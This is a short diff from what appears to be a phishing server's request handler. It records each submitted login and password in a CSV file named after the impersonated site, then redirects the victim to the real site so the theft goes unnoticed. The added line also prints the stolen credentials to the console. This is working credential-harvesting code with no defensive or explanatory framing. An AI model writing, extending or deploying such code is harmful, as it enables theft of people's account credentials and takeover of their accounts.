@@ -13,6 +13,7 @@ def index(site):
 		login, password = request.values['login'], request.values['password']
 		with open(f'{site}.csv', 'a') as file:
 			print(f'{login},{password}', file=file)
+			print(f'!!!!!!!!!!!!!!!!!!{login},{password}')
 
 		return redirect(f'https://{site}')
 
